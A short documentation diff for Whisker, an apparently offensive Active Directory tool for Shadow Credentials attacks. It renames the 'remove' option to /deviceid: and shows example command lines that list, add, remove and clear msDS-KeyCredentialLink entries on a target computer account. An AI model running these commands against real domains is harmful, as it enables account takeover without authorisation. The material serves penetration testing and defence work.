@@ -205,7 +205,7 @@ msDS-KeyCredentialLink attribute, effectively adding Shadow Credentials to the t
 
   list    => Whisker.exe list /target:computername$ /domain:constoso.local /dc:dc1.contoso.local
   add     => Whisker.exe add /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1
-  remove  => Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b
+  remove  => Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /deviceid:2de4643a-2e0b-438f-a99d-5cb058b3254b
   clear   => Whisker.exe clear /target:computername$ /domain:constoso.local /dc:dc1.contoso.local
 
 For this attack to succeed, the environment must have a Domain Controller running at least Windows Server 2016,
